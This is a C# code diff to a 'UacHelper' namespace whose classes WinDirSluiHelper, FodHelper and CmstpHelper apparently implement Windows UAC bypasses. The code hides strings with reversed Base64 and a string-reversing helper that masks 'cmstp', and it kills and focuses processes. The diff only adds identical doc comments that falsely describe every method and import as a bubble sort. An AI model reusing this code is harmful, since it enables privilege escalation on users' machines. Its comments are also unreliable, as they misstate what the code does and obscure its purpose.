@@ -14,6 +14,12 @@ namespace UacHelper
 {
     public class WinDirSluiHelper
     {
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static async Task<bool> Run(string path)
         {
             bool worked = false;
@@ -63,12 +69,27 @@ namespace UacHelper
     public class FodHelper 
     {
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("kernel32.dll")]
         private static extern bool CreateProcess(
          string lpApplicationName,
@@ -163,11 +184,23 @@ namespace UacHelper
 
     public class CmstpHelper//copy pasted from my prevoius project 
     {
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string Base64Encode(string plainText)
         {
             var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
             return System.Convert.ToBase64String(plainTextBytes);
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string Base64Decode(string base64EncodedData)
         {
             var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
@@ -177,17 +210,40 @@ namespace UacHelper
         public static string pt1 = "NEc1RXZTVmcQ5WdStlCNoQDu9Wa0NWZTNHZuFWbt92QwVHdlNVZyBlb1JVPzRmbh1WbvNEc1RXZTVmcQ5WdSpQDzJXZzVFbsFkbvlGdjV2U0NXZER3culEdzV3Q942bpRXYulGdzVGRt9GdzV3QK0QXsxWY0NnbJRHb1FmZlR0WK0gCNUjLy0jROlEZlNmbhZHZBpQDk82ZhNWaoNGJ9Umc1RXYudWaTpQDd52bpNnclZ3W";
         public static string pt2 = "UsxWY0NnbJVGbpZ2byBlIgwiIFhVRuIzMSdUTNNEXzhGdhBFIwBXQc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90UiACLi0ETLhkIK0QXu9Wa0NWZTRUSEx0XyV2UVxGbBtlCNoQD3ACLu9Wa0NWZTRUSEx0XyV2UVxGbB1TMwATO0wCMwATO0oQDdNnclNXVsxWQu9Wa0NWZTR3clREdz5WS0NXdDtlCNoQDG9CIlhXZuAHdz12Yg0USvACbsl2arNXY0pQDF5USM9FROFUTN90QfV0QBxEUFJlCNwGbhR3culGIvRHIz5WanVmQgAXd0V2UgUmcvZWZCBib1JHIlJGIsxWa3BSZyVGSgMHZuFWbt92QgsjCN0lbvlGdjV2UzRmbh1Wbv";
         public static string pt3 = "gCNoQDi4EUWBncvdkI9UWbh50Y2NFdy9GaTpQDi4EUWBncvdkI9UWbh5UZjlmdyV2UK0QXzdmbpJHdTtlCNoQDiICIsISJy9mcyVEZlR3YlBHel5WVlICIsICa0FG";
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
 
         public static string path = "UGel5Cc0NXbjxlMz0WZ0NXezx1c39GZul2dcpzY";
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string Reverse(string s)
         {
             char[] charArray = s.ToCharArray();
             Array.Reverse(charArray);
             return new string(charArray);
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string SetData(string CommandToExecute)
         {
             string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
@@ -207,6 +263,11 @@ namespace UacHelper
             return OutputFile.ToString();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static void Kill()
         {
             foreach (var process in Process.GetProcessesByName(Reverse("ptsmc")))
@@ -240,6 +301,11 @@ namespace UacHelper
             return true;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static IntPtr SetWindowActive(string ProcessName)
         {
             Process[] target = Process.GetProcessesByName(ProcessName);
